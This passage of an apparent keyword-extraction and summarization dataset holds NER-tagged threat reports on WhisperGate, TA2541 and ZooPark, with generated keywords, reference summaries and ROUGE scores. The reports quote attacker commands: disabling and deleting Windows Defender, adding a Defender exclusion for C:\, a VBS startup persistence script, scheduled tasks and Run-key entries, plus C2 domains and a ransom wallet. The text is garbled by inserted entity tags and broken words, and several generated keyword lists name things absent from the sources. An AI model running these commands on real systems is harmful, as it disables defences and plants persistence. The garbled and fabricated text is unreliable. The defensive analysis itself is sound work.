screenshot showing the ransom note from an affected virtual machine . Contained within the ransom note are instructions soliciting payment to a bitcoin wallet address of [CARDINAL] 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv . The wallet does not appear to have received funds from victims as of the publication of this post.4/13Stage 2/3 : Discord downloader and injector\u00b6Once the payload has gained a foothold , further destructive capabilities are facilitated by the stage [CARDINAL] 2 binary , called stage2.exe . This binary pulls down and launches a payload hosted via the [ORG] Discord content delivery network , a recently reported approach which is increasingly being used by malicious actors . The obfuscated .NET payload ( described as Stage 3 below ) is then executed in memory , setting off a number of events including:5/13Writing and executing a VBS script that uses [ORG] PowerShell to add a Windows Defender exclusion on the root directory ( C:)Writing and executing a VBS script\"C:\\Windows\\System32\\WScript.exe\"\"C:\\Users\\jim\\AppData\\Local\\Temp\\Nmddfrqqrbyjeygggda.vbs\"Uses PowerShell to add a Windows Defender exclusionpowershell.exe Set - MpPreference -ExclusionPath ' [ORG] C:\\'AdvancedRun , a program used to run Windows applications with different settings , is then dropped to disk and executed in order to launch the Service Control Manager and stop the Windows Defender service ( WinDefend).AdvancedRun is used to stop Windows Defender\"C:\\Users\\jim\\AppData\\Local\\Temp\\AdvancedRun.exe \" /EXEFilename \" C:\\Windows\\System32\\sc.exe \" /WindowState 0 /CommandLine \" stop [PRODUCT] WinDefend \" /StartDirectory \" \" /RunAs [CARDINAL] 8 /RunAdvancedRun is used again when launching [ORG] PowerShell to recursively delete the Windows Defender directory and its files . [ORG] AdvancedRun deleting [PRODUCT] the [PRODUCT] Windows [PRODUCT] Defender directory\"C:\\Users\\jim\\AppData\\Local\\Temp\\AdvancedRun.exe \" /EXEFilename \" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \" /WindowState 0 /CommandLine \" rmdir ' [WORK_OF_ART] C:\\ProgramData\\Microsoft\\Windows [WORK_OF_ART] Defender ' -Recurse \" /StartDirectory \" \" /RunAs [CARDINAL] 8 /RunCopies InstallUtil.exe is a command - line utility that allows users to install and uninstall server resources from the local machine into the user \u2019s % TEMP% directory . This action leverages the file for process hollowing by launching it in a suspended state.6/13It then proceeds to allocate memory ( VirtualAllocEx ) , write the file corruptor payload ( described as [ORG] the [ORG] Final [ORG] Stage below ) into memory ( WriteProcessMemory ) , modify the thread entry point ( SetThreadContext ) to point to the file corruptor entry point , and start execution of the file corruptor ( ResumeThread ) .Final stage : File corruptor\u00b6The final file corruptor payload is loaded in memory via process hollowing to the [PRODUCT] InstallUtil process . The file [NORP] corruptor:7/13Targets any local hard drives , attached [ORG] USB drives , or mounted network shares [NORP] Scans directories for files matching internal hard - coded extension list ( excluding [LOC] the [LOC] Windows [LOC] folder).3DM .3DS .602 .7Z .ACCDB .AI .ARC .ASC .ASM .ASP .ASPX .BACKUP .BAK .BAT .BMP .BRD .BZ .BZ2 .C .CGM .CLASS .CMD .CONFIG .CPP .CRT .CS .CSR .CSV .DB .DBF .DCH .DER .DIF .DIP .DJVU.SH .DOC .DOCB .DOCM .DOCX .DOT .DOTM .DOTX .DWG .EDB .EML .FRM .GIF .GO .GZ .H .HDD .HTM .HTML .HWP .IBD .INC .INI .ISO .JAR .JAVA .JPEG .JPG .JS .JSP .KDBX .KEY .LAY .LAY6 .LDF .LOG .MAX .MDB .MDF .MML .MSG .MYD .MYI .NEF .NVRAM .ODB .ODG .ODP .ODS .ODT .OGG .ONETOC2 .OST .OTG .OTP .OTS .OTT .P12 .PAQ .PAS .PDF .PEM .PFX .PHP .PHP3 .PHP4 .PHP5 .PHP6 .PHP7 .PHPS .PHTML .PL .PNG .POT .POTM .POTX .PPAM .PPK .PPS .PPSM .PPSX .PPT .PPTM .PPTX .PS1 .PSD .PST .PY .RAR .RAW .RB .RTF .SAV .SCH .SHTML .SLDM .SLDX .SLK .SLN .SNT .SQ3 .SQL .SQLITE3 .SQLITEDB .STC .STD .STI .STW .SUO .SVG .SXC .SXD .SXI .SXM .SXW .TAR .TBK .TGZ .TIF .TIFF .TXT .UOP .UOT .VB .VBS .VCD .VDI .VHD .VMDK .VMEM .VMSD .VMSN .VMSS .VMTM .VMTX .VMX .VMXF .VSD .VSDX .VSWP .WAR .WB2 .WK1 .WKS .XHTML .XLC .XLM .XLS .XLSB .XLSM .XLSX .XLT .XLTM .XLTX .XLW .YML .ZIPOverwrites the start of each targeted file with 1 MB of static data ( byte 0xCC ) , regardless of file size Renames each targeted file to a randomized extension Changes to the [ORG] MBR are particularly strong signals of anomalous and destructive activity typically associated with ransomware . To counteract this , [NORP] Elastic security researchers built an [ORG] MBR protection component based around these signals into our multi - layered ransomware protection feature.8/13When a process attempts to overwrite the contents of the [ORG] MBR , the prewrite buffer and other associated process metadata will be analyzed inline before any changes are written to disk . If the activity is deemed malicious in nature , the process will either be terminated immediately ( prevention mode ) and / or an appropriate ransomware alert will be generated ( prevention and detection modes ) to allow security operators time to respond . When configured in prevention mode , [ORG] Elastic [ORG] Security \u2019s ransomware protection ensures that the integrity of the [ORG] MBR is fully preserved , with no changes ever reaching disk thanks to the synchronous framework leveraged by the feature \u2014 effectively preventing the ransomware attack in their tracks as the offending process is terminated . When [ORG] WriteFile is invoked on PhysicalDrive0 on a host running [WORK_OF_ART] Elastic [WORK_OF_ART] Security with ransomware protection enabled , the pending change will immediately be analyzed and deemed malicious . Afterwards , the process will be terminated , the endpoint user will be alerted via a popup notification , and a ransomware prevention alert will be sent to and stored in [ORG] Elasticsearch . The intended ransom note can be easily deciphered after [PERSON] Base64 decoding the contents of the prewrite buffer found in the alert within [PERSON] Kibana . It is important to note that while this behaviour is detected by [NORP] Elastic , it is not specific to this payload and rather the behaviour the payload is exhibiting . This increases our chance of being able to detect and prevent malicious behaviors , even when a static signature of the malware is not known . Threat actors find this kind of control more difficult to evade than traditional , signature - based detection and prevention approaches . Observing WhisperGate in [LOC] Elastic [LOC] Security\u00b69/13By observing the process hash of the stage [CARDINAL] 1 dropper above function within [ORG] Elastic [ORG] Security , we can isolate the ransomware alert and analyze the blocked attempt at overwriting the MBR.10/13As we can see , the data is stored as a [PERSON] Base64 encoded string in Elasticsearch . Decoded , we can see the contents of the ransom note that would be displayed to the end user of an affected system . [PERSON] Alert breakdown and defensive recommendations\u00b6 The following alerts were triggered in [ORG] Elastic [ORG] Security during our investigations : [ORG] Endpoint [ORG] Security [ORG] Integration Alerts\u00b6 ( 34CA75A8C190F20B8A7596AFEB255F2228CB2467BD210B2637965B61AC7EA907 ) ) [PERSON] Ransomware [PERSON] Prevention [PERSON] Alert ( canary files ) Malicious Behaviour Prevention Alert - Binary Masquerading via [ORG] Untrusted [ORG] Path [ORG] Memory [ORG] Threat [ORG] Prevention [ORG] AlertPrebuilt [ORG] Detection [ORG] Engine Alerts\u00b6 The following existing public detection rules can also be used to detect some of the employed techniques:11/13Hunting queries\u00b6 Detect attempt to tamper with Windows defender settings via [ORG] NirSoft [ORG] AdvancedRun executed by the Stage 3 injector : Detect attempts to tamper with Windows Defenderprocess where event.type = = \" start \" and Process.pe.original_file_name = = \" AdvancedRun.exe \" and process.command_line :( \" * rmdir*Windows Defender*Recurse * \" , \" * stop WinDefend*\")Masquerade as [PRODUCT] InstallUtil via code injection : Identifies code injection with [ORG] InstallUtilprocess where event.type = = \" start \" and process.pe.original_file_name = = \" InstallUtil.exe \" and not process.executable : \" ? : \\\\Windows\\\\Microsoft . [ORG] NET\\\\*\"MITRE [ORG] ATT&CK\u00b6Summary\u00b6 [ORG] These targeted attacks on [GPE] Ukraine using destructive malware match a similar pattern observed in the past such as [ORG] NotPetya . By leveraging different malware components to wipe machines and corrupt files , it \u2019s apparent there was no intent to recover any funds , but likely a technique used to sow chaos and doubt into [GPE] Ukraine \u2019s stability . As these events are still ongoing , we wanted to release some initial analysis and observations from our perspective . We also wanted to highlight the prevention capabilities of [ORG] Elastic [ORG] Security across each stage of this attack , available to everyone [DATE] today . Existing Elastic Security users can access these capabilities within the product . If you \u2019re new to [ORG] Elastic [ORG] Security , take a look at our Quick Start guides ( bite - sized training videos to get you started quickly ) or our original)SHA256 Stage3(Injector - fixed)SHA256 Stage4 ( FileCorruptor)Last update : [DATE] January [DATE] 19 , [DATE] 2022 [DATE] Created : [DATE] January [DATE] 19 , 202213/13", "generated_text": "the document; Elastic Security; a new campaign; Ukrainian government entities; organizations; The malware; WhisperGate; a wiper; the Master Boot Record; the malware; any machine; boot-up; the MBR; a file infector component; files; specific directories; the elements; the campaign; the same Bitcoin address; each victim; the adversary; the same Bitcoin address; each victim; the same Bitcoin address; the victim; the malware; a cryptocurrency; the same Bitcoin address; a ransomware compromise; the same Bitcoin address; each victim; the attacker; its malware; the same Bitcoin address; each victim; the malware; a ransom note; any device; the payment; a Bitcoin wallet address; the Elastic Security team; procedures; tampering; Windows Defender; the process; the backdoor; the end; exclusion; the endpoint; security; protection; EXEs; the campaign; a custom malware; the Malware.", "ref_text": "<START-1>Here is a summary of the key points from the PDF document: The document analyzes a new destructive malware campaign called Operation Bleeding Bear targeting organizations in Ukraine. The multi-stage attack involves an initial MBR wiper payload to make systems inoperable, followed by a file infector to corrupt specific file types. The first stage MBR wiper overwrites the master boot record, displaying a ransom note on reboot though no decryption is offered. The second stage uses a Discord downloader to retrieve the main payload which tampers with Windows Defender through scripts and process hollowing. The final payload leverages process hollowing to load a file corrupter that overwrites, renames, and deletes targeted file types on local and networked drives. The goal appears to be destroying data rather than obtaining ransom. Elastic Security is able to prevent each stage of the attack using memory threat prevention, malware prevention, and ransomware prevention capabilities. Queries and detection rules are provided to identify the malicious behaviors. The campaign matches past destructive attacks like NotPetya that aim to destabilize and sow chaos rather than financial gain. The analysis provides insight into the adversary's techniques and how Elastic Security can mitigate similar threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4777777777777778, "gpt3/lexical/rouge_rouge2": 0.10614525139664804, "gpt3/lexical/rouge_rougeL": 0.22222222222222224, "gpt3/lexical/rouge_rougeLsum": 0.22222222222222224, "gpt3_generated_text": ["The article discusses a new campaign that targets Ukrainian government entities and organizations with destructive malware. The malware, known as WhisperGate, utilizes a wiping capability on the Master Boot Record (MBR) to render the affected machine inoperable after boot-up. Additionally, a file infector component is used to corrupt files in specific directories with specific file extensions. The campaign lacks the characteristics of a typical ransomware compromise, as the adversary uses the same Bitcoin address for each victim and offers no intent to help decrypt the victim's machine. The article emphasizes the importance of prevention in dealing with ransomware and malware with destructive capabilities. Elastic Security provides advanced malware detection and ransomware protection capabilities to protect against such attacks. The article also provides a breakdown of the malware's stages, including the MBR payload and the Discord downloader and injector. The malware uses various techniques, such as tampering with Windows Defender and using a custom malware to facilitate its destructive capabilities."]}, {"split_name": "val", "sample_id": "val_73", "prompt_text": "Extract the keywords: www.proofpoint.com /us / blog / threat - insight / charting - ta2541s - flight [PERSON] Charting TA2541 's Flight | [GPE] Proofpoint US [DATE] February 15 , [DATE] 2022 [PERSON] Selena [PERSON] Larson and [PERSON] Joe [PERSON] Wise \u22ee \u22ee [CARDINAL] 2/9/2022Key [ORG] FindingsProofpoint researchers have tracked a persistent cybercrime threat actor targeting aviation , aerospace , transportation , manufacturing , and defense industries for [DATE] years . The threat actor consistently uses remote access trojans ( RATs ) that can be used to remotely control compromised machines . The threat actor uses consistent themes related to aviation , transportation , and travel . The threat actor has used similar themes and targeting since [DATE] 2017 . Proofpoint calls this actor TA2541.OverviewTA2541 is a persistent cybercriminal actor that distributes various remote access trojans ( RATs ) targeting the aviation , aerospace , transportation , and defense industries , among others . [GPE] Proofpoint has tracked this threat actor since [DATE] 2017 , and it has used consistent tactics , techniques , and procedures ( TTPs ) in that time . Entities in the targeted sectors should be aware of the actor 's TTPs and use the information provided for hunting and detection . TA2541 uses themes related to aviation , transportation , and travel . When [ORG] Proofpoint first started tracking this actor , the group sent macro - laden [ORG] Microsoft [ORG] Word attachments that downloaded the [ORG] RAT payload . The group pivoted , and now they more frequently send messages with links to cloud services such as [FAC] Google [FAC] Drive hosting the payload . Proofpoint assesses TA2541 is a cybercriminal threat actor due to its use of specific commodity malware , broad targeting with high volume messages , and command and control infrastructure . While public reporting detailing similar threat activities exists since [DATE] at [DATE] least [DATE] 2019 , this is the [ORDINAL] first time [GPE] Proofpoint is sharing comprehensive details linking public and private data under [CARDINAL] one threat activity cluster we call TA2541.Campaign [ORG] DetailsUnlike many cybercrime threat actors distributing commodity malware , TA2541 does not typically use current events , trending topics , or news items in its social engineering lures . In nearly all observed campaigns , TA2541 uses lure themes that include transportation related terms such as flight , aircraft , fuel , yacht , charter , etc.1/10Figure [CARDINAL] 1 : Email lure requesting information on aircraft parts.2/10Figure [CARDINAL] 2 : Email lure requesting ambulatory flight information . TA2541 demonstrates persistent and ongoing threat activity since [DATE] January [DATE] 2017 . Typically , its malware campaigns include [CARDINAL] hundreds [CARDINAL] to [CARDINAL] thousands of messages , although it is rare to see TA2541 send [CARDINAL] more [CARDINAL] than [CARDINAL] 10,000 messages at one time . Campaigns impact [CARDINAL] hundreds of organizations globally , with recurring targets in [LOC] North [LOC] America , [LOC] Europe , and [LOC] the [LOC] Middle [LOC] East . Messages are nearly always in [LANGUAGE] English . In [DATE] the [DATE] spring [DATE] of [DATE] 2020 , TA2541 briefly pivoted to adopting COVID - related lure themes consistent with their overall theme of cargo and flight details . For example , they distributed lures associated with cargo shipments of personal protective equipment ( [ORG] PPE ) or [PERSON] COVID-19 testing kits.3/10Figure [CARDINAL] 3 : [ORG] PPE themed lure used by TA2541.The adoption of COVID-19 themes was brief , and the threat actor quickly returned to generic cargo , flight , charter , etc . themed lures . Multiple researchers have published data on similar activities since [DATE] 2019 including [PERSON] Cisco [PERSON] Talos , [PERSON] Morphisec , [ORG] Microsoft , [ORG] Mandiant , and independent researchers . Proofpoint can confirm the activities in these reports overlap with the threat actor tracked as TA2541.Delivery and [ORG] InstallationIn recent campaigns , [GPE] Proofpoint observed this group using [FAC] Google [FAC] Drive URLs in emails that lead to an obfuscated Visual Basic Script ( VBS ) file . If executed , [ORG] PowerShell pulls an executable from a text file hosted on various platforms such as Pastetext , Sharetext , and [ORG] GitHub . The threat actor executes [ORG] PowerShell into various Windows processes and queries [ORG] Windows [ORG] Management [ORG] Instrumentation ( WMI ) for security products such as antivirus and firewall software , and attempts to disable built - in security protections . The threat actor will collect system information before downloading the RAT on the host.4/10Figure [CARDINAL] 4 : Example attack chain . While TA2541 consistently uses [FAC] Google [FAC] Drive , and occasionally [ORG] OneDrive , to host the malicious VBS files , beginning in [DATE] late [DATE] 2021 , [ORG] Proofpoint observed this group begin using [ORG] DiscordApp URLs linking to a compressed file which led to either [ORG] AgentTesla or [PERSON] Imminent [PERSON] Monitor . [ORG] Discord is an increasingly popular content delivery network ( CDN ) used by threat actors . Although TA2541 typically uses URLs as part of the delivery , [GPE] Proofpoint has also observed this actor leverage attachments in emails . For example , the threat actor may send compressed executables such as [ORG] RAR attachments with an embedded executable containing URL to CDNs hosting the malware payload . Listed below is an example of a [ORG] VBS file used in a recent campaign leveraging the [ORG] StrReverse function and [ORG] PowerShell \u2019s [ORG] RemoteSigned functionality . It is worth noting the VBS files are usually named to stay consistent with the overall email themes : fight , aircraft , fuel , yacht , charter , etc.5/10Figure [CARDINAL] 5 : Contents of a sample VBS file . Deobfuscated command : url figure below depicts an example from a recent campaign where the [ORG] PowerShell code is hosted on the paste.ee URL.Figure [CARDINAL] 6 : Paste URL example . Persistence : Typically , TA2541 will use Visual Basic Script ( VBS ) files to establish persistence with [CARDINAL] one of their favorite payloads , AsyncRAT . This is accomplished by adding the [ORG] VBS file in the startup directory which points to a [ORG] PowerShell script . Note : the VBS and [ORG] PowerShell file names used are mostly named to mimic [PRODUCT] Windows or system functionality . Examples from recent campaigns include : Persistence Example : C:\\Users[User]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemFramework64Bits.vbsContents of VBS file : Set Obj = CreateObject(\"WScript . Shell\")Obj . Run \" PowerShell -ExecutionPolicy [ORG] RemoteSigned -File \" & \" C:\\Users\\ [ User]\\AppData\\Local\\Temp\\RemoteFramework64.ps1 \" , 06/10Other Recent VBS File Names ObservedUserInterfaceLogin.vbsHandlerUpdate64Bits.vbsWindowsCrashReportFix.vbsSystemHardDrive.vbsTA2541 has also established persistence by creating scheduled tasks and adding entries in the registry . For instance , in [DATE] November [DATE] 2021 TA2541 distributed the payload Imminent Monitor using both of these methods . In recent campaigns , [ORG] vjw0rm and [ORG] STRRAT also leveraged task creation and adding entries to the registry . For example : Scheduled Task : schtasks.exe /Create /TN \" Updates\\BQVIiVtepLtz \" /XML C:\\Users\\ [ User]\\AppData\\Local\\Temp\\tmp7CF8.tmpschtasks /create /sc minute /mo [CARDINAL] 1 /tn Skype /tr \" C:\\Users\\[Use]\\AppData\\Roaming\\xubntzl.txt\"Registry : Key : HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchostData : C:\\Users[User]\\AppData\\Roaming\\server\\server.exeKey : HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\xubntzlData : C:\\Users\\User\\AppData\\Roaming\\xubntzl.txtMalwareProofpoint has observed TA2541 using [CARDINAL] over [CARDINAL] a [CARDINAL] dozen different malware payloads since [DATE] 2017 . The threat actor uses commodity malware available for purchase on criminal forums or available in open - source repositories . Currently , TA2541 prefers AsyncRAT , but other popular RATs include [ORG] NetWire , [ORG] WSH [ORG] RAT and [LAW] Parallax.7/10Figure [LAW] 7 : [ORG] Malware used by TA2541 associated with message volume . All the malware used by TA2541 can be used for information gathering purposes and to gain remote control of an infected machine . At this time , [GPE] Proofpoint does not know what the threat actor \u2019s ultimate goals and objectives are once it achieves initial compromise . While AsyncRAT is the current malware of choice , TA2541 has varied its malware use [DATE] each [DATE] year since [DATE] 2017 . The threat actor will typically use [CARDINAL] just [CARDINAL] one or a handful of RATs in observed campaigns , however in [DATE] 2020 , [GPE] Proofpoint observed TA2541 distributing over [CARDINAL] 10 different types of malware , all using the same initial infection chain . Figure [CARDINAL] 8 : Distribution of TA2541 malware over time . Infrastructure8/10TA2541 uses [ORG] Virtual [ORG] Private [ORG] Servers as part of their email sending infrastructure and frequently uses [NORP] Dynamic DNS ( [ORG] DDNS ) for C2 infrastructure . There are multiple patterns across the C2 infrastructure and the message artifacts . For example , historic campaigns have included the term \u201c kimjoy \u201d in the [CARDINAL] C2 domain name as well as in the threat actor reply - to address . Another striking [ORG] TTP is the common pattern observed with TA2541 C2 domains and payload staging URLs containing the keywords \u201c kimjoy , \u201d \u201c h0pe , \u201d and \u201c grace \u201d . TA2541 also regularly uses the same domain registrars including [WORK_OF_ART] Netdorm and No - IP DDNS , and hosting providers including [ORG] xTom GmbH and [PERSON] Danilenko , [PERSON] Artyom . VictimologyOften , campaigns contained [CARDINAL] several [CARDINAL] hundred to several thousand email messages to [CARDINAL] dozens of different organizations . Although [GPE] Proofpoint has observed TA2541 targeting [CARDINAL] thousands of organizations , multiple entities across aviation , aerospace , transportation , manufacturing , and defense industries appear regularly as targets of its campaigns . There appears to be a wide distribution across recipients , indicating TA2541 does not target people with specific roles and functions . ConclusionTA2541 remains a consistent , active cybercrime threat , especially to entities in its most frequently targeted sectors . [ORG] Proofpoint assesses with high confidence this threat actor will continue using the same TTPs observed in historic activity with minimal change to its lure themes , delivery , and installation . It is likely TA2541 will continue using AsyncRAT and vjw0rm in future campaigns and will likely use other commodity malware to support its objectives . Indicators of Compromise ( IOCs)C2 DomainsDescription Indicator AsyncRAT C2 Domain joelthomas[.]linkpc[.]net AsyncRAT C2 Domain rick63[.]publicvm[.]com AsyncRAT C2 Domain tq744[.]publicvm[.]com AsyncRAT C2 Domain bodmas01[.]zapto[.]org bigdips0n[.]publicvm[.]com AsyncRAT C2 Domain AsyncRAT C2 Domain 6001dc[.]ddns[.]net kimjoy[.]ddns[.]net Revenge RAT C2 Domain AsyncRAT C2 Domain h0pe[.]ddns[.]net AsyncRAT C2 Domain e29rava[.]ddns[.]net akconsult[.]ddns[.]net AsyncRAT C2 Domain grace5321[.]publicvm[.]com StrRAT C2 Domain grace5321[.]publicvm[.]com Imminent Monitor C2 Domain November 2021Date Observed April / May [DATE] 2021 2034979 - ET HUNTING Powershell Request for paste .ee Page 2034980 - ET [PERSON] MALWARE [PERSON] Powershell with [ORG] Decimal [ORG] Encoded [ORG] RUNPE [ORG] Downloaded [CARDINAL] 2850933 - ETPRO HUNTING Double Extension VBS Download from Google Drive 2850934 - ETPRO HUNTING Double Extension PIF Download from [FAC] Google [FAC] Drive 2850936 - ETPRO HUNTING VBS Download from Google Drive10/10", "generated_text": "Proofpoint; a persistent cybercrime threat actor; TA2541; years; use; RATs; remote access trojans; RATs; remote control; compromised machines; the threat actor; 2017; themes; aviation; transportation; fuel; yacht; charter; cargo; COVID-19; tactics; procedures; emails; links; Google Drive; payloads; continuous threat activity; targets; North America; Europe; Middle East; recurring targets; North America; Europe; Middle East; RATs; specific commodity malware; large numbers; tactics; tactics; techniques; procedures; the group; ten; thousands; operations; attacks; hundreds; sectors; recurring targets; South America; Europe; Middle East; Use; the use; commodity malware; recurring threats; signatures; recent campaigns; a persistent cybercriminal actor; TA2541.", "ref_text": "<START-1>The PDF describes the activities of a cybercriminal group called TA2541 that has been targeting aviation, aerospace, transportation, manufacturing, and defense industries since at least 2017. TA2541 uses themes related to aviation and transportation in its phishing emails to distribute remote access trojans (RATs) like AsyncRAT. The group has consistently used the same tactics, techniques and procedures over time. It sends emails with links or attachments that install VBScripts, which then pull down the RAT payload from sites like Pastebin. TA2541 briefly used COVID-19 themes in 2020 but quickly went back to aviation and transportation lures. The group establishes persistence on infected machines using scheduled tasks, registry edits, and VBS startup scripts. Over a dozen different RATs have been observed from the group over the years, with AsyncRAT being the most common recently. Infrastructure patterns link campaigns together, like \"kimjoy\" in domain names and email addresses. The group uses dynamic DNS and common hosting providers. Campaigns distribute hundreds to thousands of messages to a wide range of targets globally. Aviation, aerospace and transportation are hit most frequently. Proofpoint expects TA2541 to continue using the same techniques seen historically. The report provides indicators of compromise like VBS hashes and C2 domains to help detect activity. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5223880597014926, "gpt3/lexical/rouge_rouge2": 0.19499999999999998, "gpt3/lexical/rouge_rougeL": 0.26865671641791045, "gpt3/lexical/rouge_rougeLsum": 0.26865671641791045, "gpt3_generated_text": ["Proofpoint researchers have been tracking a persistent cybercrime threat actor, known as TA2541, that has been targeting industries such as aviation, aerospace, transportation, manufacturing, and defense for several years. The threat actor consistently uses remote access trojans (RATs) to remotely control compromised machines. Since 2017, TA2541 has used similar themes related to aviation, transportation, and travel in its campaigns. The group initially used macro-laden Microsoft Word attachments but later shifted to sending messages with links to cloud services like Google Drive hosting the RAT payload. TA2541 is considered a cybercriminal threat actor due to its use of specific commodity malware, broad targeting with high volume messages, and command and control infrastructure. The group typically sends hundreds to thousands of messages in its campaigns, impacting organizations globally, with recurring targets in North America, Europe, and the Middle East. While TA2541 briefly adopted COVID-19 themes in its lures, it quickly returned to generic cargo, flight, and charter themes. The group has been observed using Google Drive and DiscordApp URLs to deliver their malicious payloads. Proofpoint advises entities in the targeted sectors to be aware of TA2541's tactics, techniques, and procedures (TTPs) for hunting and detection purposes."]}, {"split_name": "val", "sample_id": "val_74", "prompt_text": "Extract the keywords: T HREAT SCAT EGORIEST AGSENCYCLOPEDIAST AT IST ICS DESCRIPT IONSEnglishAPT REPORT SWho \u2019s who in [ORG] the [ORG] Zoo Who \u2019s who in the Zoo Cyberespionage operation targets [ORG] Android users in the Middle EastBy Alexey Firsh on [DATE] May 3 , [DATE] 2018 . 10:00 amEnergetic Bear / Crouching [PERSON] Yeti : attacks on serversA Slice of 2017 Sofacy ActivitySofacy APT hits high profile targets with updated toolsetAPT Trends report [PERSON] Q3 2017From Linux to Windows \u2013 New Family of Cross - Platform Desktop Backdoors DiscoveredZooPark is a cyberespionage operation that has been focusing on [NORP] Middle [NORP] Eastern targets since [DATE] at [DATE] least [DATE] June [DATE] 2015 . T he threat actors behind the operation infect [ORG] Android devices using several generations of malware , with the attackers including new features in each iteration . We label them from v1 - v4 , with v4 being the most recent version deployed in [DATE] 2017 . From the technical point of view , the evolution of [ORG] ZooPark has shown notable progress : from the very basic [ORDINAL] first and [ORDINAL] second versions , the commercial spyware fork in its [ORDINAL] third version and then to the complex spyware that is version [CARDINAL] 4 . T his last step is especially interesting , showing a big leap from straightforward code functionality to highly sophisticated malware . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Evolution of ZooP ark malware features [WORK_OF_ART] Evolution [WORK_OF_ART] of [WORK_OF_ART] ZooP ark malware featuresWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation [PERSON] API!We have observed [CARDINAL] two main distribution vectors for [ORG] ZooPark \u2013 T elegram channels and watering holes . T he [ORDINAL] second one was the preferred vector : we found several news websites that have been hacked by the attackers to redirect visitors to a downloading site that serves malicious APKs . Some of the themes observed in campaign include \u201c [GPE] Kurdistan referendum \u201d , \u201c T elegramGroups \u201d and \u201c [GPE] Alnaharegypt news \u201d , among others . T arget profile has evolved during [DATE] the [DATE] last [DATE] years of campaign , focusing on victims in [GPE] Egypt , [GPE] Jordan , [GPE] Morocco , [GPE] Lebanon and [GPE] Iran . If you would like to learn more about our intelligence reports or request more information on a specific report , contact us at : intelreports@kaspersky.com . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Re ad t he f ull \u201c Who \u2019s who in t he Z o o . Cybe r e spio nage o pe r at io n t ar ge t s Re ad t he f ull \u201c Who \u2019s who in t he Z o o . Cybe r e spio nage o pe r at io n t ar ge t [ORG] sAndr o i d use r s in t he [LOC] Middle [LOC] East . \u201d r e po r t [PERSON] Andr o i d use r s in t he [LOC] Middle [LOC] East . \u201d r e po r tAPT BACKDOOR CYBERESPIONAGE GOOGLE ANDROID MALWARE DESCRIPT [ORG] IONSShare post on : WAT ERING HOLE AT T ACKSRelated Posts Related Posts\uf09a \uf0d5 \uf099Energetic Bear / Crouching [PERSON] Yeti : attacks on serversLeaking adsRoaming Mantis uses [ORG] DNS hijacking to infect [ORG] Android [ORG] smartphonesLEAVE [ORG] A [ORG] REPLY [ORG] LEAVE [ORG] A [ORG] REPLY [ORG] Your e mail addre ss will not be publishe d. Re quire d fie lds are marke d * Ente r your comme nt he reName * Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Email * Notify me whe n ne w comme nts are adde d. SUBMITreCAPTCHAPlease upgrade to a supported browser to get a reCAPTCHA challenge . Alternatively if you think you are getting this page in error , please check your internet connection and reload . Why is this happening to me?Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API ! \u00a9 [DATE] 2018 [PERSON] AO [PERSON] Kaspe rsky Lab . All Rights Re se rve d. Re giste re d trade marks and se rvice marks are the prope rty of the ir re spe ctive owne rs . EmailSUBSCRIBEContact us | Privacy Policy | Lice nse Agre e me ntWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API !", "generated_text": "the report; ZooPark; Middle Eastern; Android users; June 2015; v1; v4; Safari; elgram channels; watering holes; news websites; APKs; the group; Kurdistan referendum; Alnaharegypt news; Egypt; Jordan; Morocco; Lebanon; Iran; a new family; cross-platform desktop backdoors; zooP ark; the evolution; the malware; evolution; ad; stage; the zoo; the evolution; Adobe Flash; the malware; developers; tools; adware; system info; compromise; the malware; updates; detection; tools.", "ref_text": "<START-1>ZooPark is a cyberespionage campaign active since at least 2015 that targets Android devices primarily in the Middle East. The attackers use evolving malware dubbed v1-v4, with v4 being the most sophisticated version observed in 2017. Initial infection vectors include Telegram channels and watering hole attacks on news sites about topics of interest to victims. Main targets are located in Egypt, Jordan, Morocco, Lebanon, and Iran based on campaign themes. The malware capabilities evolved from basic functions in v1-v2 to incorporating commercial spyware features in v3 and complex spyware in v4. v4 malware shows a big leap in sophistication for conducting audio surveillance, keylogging, retrieving contacts, emails, and more. Later versions communicate with command and control servers to exfiltrate data from infected devices. The report provides an overview of the cyberespionage operation and the technical evolution of the Android malware over multiple versions. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5765124555160142, "gpt3/lexical/rouge_rouge2": 0.2437275985663082, "gpt3/lexical/rouge_rougeL": 0.30604982206405695, "gpt3/lexical/rouge_rougeLsum": 0.30604982206405695, "gpt3_generated_text": ["The article discusses the cyberespionage operation known as ZooPark, which has been targeting Android users in the Middle East since at least June 2015. The threat actors behind ZooPark have been infecting Android devices using several generations of malware, with the most recent version being v4 deployed in 2017. The evolution of ZooPark has shown notable progress, going from basic versions to a complex spyware in version 4. The main distribution vectors for ZooPark include Telegram channels and watering holes, with the latter being the preferred vector. The attackers have hacked news websites to redirect visitors to a downloading site that serves malicious APKs. The campaign has focused on victims in Egypt, Jordan, Morocco, Lebanon, and Iran. The malware features of ZooPark have evolved over time, with the latest version showing a big leap in sophistication."]}, {"split_name": "val", "sample_id": "val_75", "prompt_text": "Extract the keywords: Navigating New FrontiersTrend Micro [DATE] 2021 Annual Cybersecurity ReportContents 4 Modern Ransomware Actors Continue to [ORG] Target [ORG] Critical Industries9 Cloud Adopters and Remote Workers Contend With Rising Threats to Cloud Environments16 Targeted Attacks Take Aim at Bigger Game With Upgraded Arsenal20 Rising Vulnerabilities Leave Unpatched Systems Exposed to More Risks26 Pandemic - Related Threats Evolve and [ORG] Continue to [GPE] Plague Remote Workers30 Increasingly Sophisticated Threats Call for Robust and Multilayered Defense32 The Threat Landscape in BriefPublished by [ORG] Trend [ORG] Micro [ORG] ResearchStock image used under license from Shutterstock.comIn [DATE] 2021 , the fast - tracked digital transformations that enabled the continuity of many organizations also opened them up to a slew of threats both old and new 